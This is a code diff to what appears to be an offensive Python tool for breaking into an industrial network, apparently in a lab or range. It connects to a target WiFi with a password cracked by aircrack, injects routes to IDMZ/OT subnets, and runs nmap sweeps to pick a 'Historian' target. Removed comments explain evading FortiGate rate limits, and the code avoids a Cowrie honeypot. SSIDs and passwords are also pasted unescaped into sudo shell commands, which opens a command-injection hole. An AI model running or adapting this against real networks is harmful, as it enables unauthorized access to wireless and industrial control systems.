@@ -640,15 +640,23 @@ def phase1_wifi_crack() -> PhaseResult:
                     _restore_managed()
 
                     if found_password:
-                        ok(f"Connecting to [bold]{chosen['ssid']}[/bold] via NetworkManager...")
+                        ssid = chosen["ssid"]
+                        ok(f"Connecting to [bold]{ssid}[/bold] via NetworkManager...")
+                        # Delete stale profile, create a fresh WPA-PSK one, then bring it up.
+                        # Explicit key-mgmt avoids the "property is missing" NM error that
+                        # occurs when NM can't auto-detect security after monitor mode.
+                        run_cmd(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true",
+                                capture=False)
                         run_cmd(
-                            f"sudo nmcli dev wifi connect '{chosen['ssid']}' "
-                            f"password '{found_password}' ifname {iface}",
+                            f"sudo nmcli con add type wifi ifname {iface} "
+                            f"con-name '{ssid}' ssid '{ssid}' -- "
+                            f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'",
                             capture=True,
                         )
+                        run_cmd(f"sudo nmcli con up '{ssid}'", capture=True)
                         info("Waiting 5 s for DHCP lease...")
                         time.sleep(5)
-                        ok(f"wlan0 should now have an IP on the target network")
+                        ok(f"{iface} should now have an IP on the target network")
                     else:
                         warn("Could not parse password from aircrack output — connect manually")
 
@@ -672,12 +680,33 @@ def phase1_wifi_crack() -> PhaseResult:
     return r
 
 
+def _parse_nmap_hosts(nmap_output: str) -> dict[str, list[str]]:
+    """
+    Parse nmap output and return {ip: [open_port, ...]} for every host
+    that has at least one genuinely open port.
+    """
+    hosts: dict[str, list[str]] = {}
+    current_ip: str | None = None
+    for line in nmap_output.splitlines():
+        # "Nmap scan report for 10.10.10.20"
+        m = re.search(r"Nmap scan report for (\S+)", line)
+        if m:
+            current_ip = m.group(1).strip("()")
+            hosts.setdefault(current_ip, [])
+            continue
+        # "22/tcp   open  ssh"
+        if current_ip and "/tcp" in line and "open" in line:
+            port = line.split("/")[0].strip()
+            hosts[current_ip].append(port)
+    # Drop hosts with no open ports
+    return {ip: ports for ip, ports in hosts.items() if ports}
+
+
 def phase2_idmz_recon() -> PhaseResult:
     phase_header(2, "IDMZ Recon (nmap)")
     r = PhaseResult("IDMZ Recon")
 
-    # Routing is injected here — after Phase 1 has connected us to the target
-    # WiFi network, so we are actually on the right segment.
+    # Routing injected here — we are now associated with the target WiFi.
     info("Injecting routes to IDMZ / OT subnets (post-WiFi association)...")
     auto_route([
         CFG["nmap"]["idmz_subnet"],
@@ -687,40 +716,65 @@ def phase2_idmz_recon() -> PhaseResult:
     subnet = CFG["nmap"]["idmz_subnet"]
     ports  = CFG["nmap"]["ports"]
 
-    # Target the Historian directly — scanning the whole /24 lets FortiGate drop
-    # the flood. -Pn skips ping discovery (FortiGate blocks ICMP too).
-    # No --min-rate to avoid triggering rate-limit rules on the firewall.
-    # No --open so filtered ports are visible (confirms FortiGate is there).
-    target_ip = CFG["historian"]["ip"]
-    nmap_cmd = (
-        f"sudo nmap -T4 -n -sS -Pn -sV --version-intensity 0 "
-        f"-p {ports} {target_ip}"
-    )
-    info(f"Targeting {target_ip} directly (FortiGate-safe, -Pn, no rate floor)")
-    rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)
+    # Sweep the full IDMZ subnet with --open so only genuinely reachable hosts
+    # are returned — avoids the false-positive from a hardcoded IP string match.
+    nmap_cmd = f"sudo nmap -T4 -n -sS -Pn -p {ports} --open {subnet}"
+    info(f"Sweeping {subnet}  ports {ports}")
+    rc, out = stream_cmd(nmap_cmd, timeout=120, line_filter=_nmap_filter)
 
-    historian_found = CFG["historian"]["ip"] in out
-    honeypot_found  = CFG["honeypot"]["ip"]  in out
+    live_hosts = _parse_nmap_hosts(out)
 
-    # Fallback: if nmap output didn't include the IP string (e.g. buffering issue),
-    # do a direct TCP check on port 22 to confirm reachability
-    if not historian_found:
-        info("IP not found in nmap output — falling back to TCP probe on port 22")
-        historian_found = _tcp_reachable(CFG["historian"]["ip"], 22, timeout=2.0)
+    # Warn on honeypot if it appeared
+    honeypot_ip = CFG["honeypot"]["ip"]
+    if honeypot_ip in live_hosts:
+        warn(f"[TRAP] Cowrie honeypot detected at {honeypot_ip} — excluded from selection")
+        del live_hosts[honeypot_ip]
 
-    if historian_found:
-        ok(f"Historian confirmed at {CFG['historian']['ip']}")
-        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
-        r.status  = "success"
-    else:
-        warn("Historian not reachable via nmap or TCP probe — check routing/FortiGate")
+    if not live_hosts:
         r.status  = "failed"
-        r.finding = "Historian not reachable"
+        r.finding = "No hosts with open ports found in IDMZ — check routing / FortiGate"
+        err(r.finding)
+        r.output  = out[-2000:]
+        return r
 
-    if honeypot_found:
-        warn(f"[TRAP] Cowrie honeypot at {CFG['honeypot']['ip']} — DO NOT target this host")
+    # ── Display discovered hosts ──────────────────────────────────────────────
+    host_table = Table(
+        title="[bold magenta]IDMZ Live Hosts[/bold magenta]",
+        show_header=True, header_style="bold cyan", border_style="dim",
+    )
+    host_table.add_column("#",          style="dim",    width=4)
+    host_table.add_column("IP Address", style="green",  width=18)
+    host_table.add_column("Open Ports", style="yellow", width=40)
+    host_list = list(live_hosts.items())
+    for i, (ip, open_ports) in enumerate(host_list, 1):
+        host_table.add_row(str(i), ip, ", ".join(open_ports))
+    console.print(host_table)
+    console.print(
+        "[dim]  Select the Historian (SSH port 22 should be open).  "
+        "[bold]q[/bold] = abort[/dim]"
+    )
+    console.print()
 
-    r.output = out[-2000:]
+    raw = Prompt.ask(f"[yellow]Select Historian IP # (1–{len(host_list)})[/yellow]").strip().lower()
+    if raw == "q":
+        r.status  = "skipped"
+        r.finding = "Skipped by operator"
+        return r
+    try:
+        chosen_ip, chosen_ports = host_list[int(raw) - 1]
+    except (ValueError, IndexError):
+        r.status  = "failed"
+        r.finding = "Invalid selection"
+        err(r.finding)
+        return r
+
+    # Persist selection so all later phases target the right machine
+    CFG["historian"]["ip"] = chosen_ip
+    ok(f"Historian set to [bold]{chosen_ip}[/bold]  (open ports: {', '.join(chosen_ports)})")
+
+    r.status  = "success"
+    r.finding = f"Historian confirmed at {chosen_ip}  ports: {', '.join(chosen_ports)}"
+    r.output  = out[-2000:]
     return r
 
 
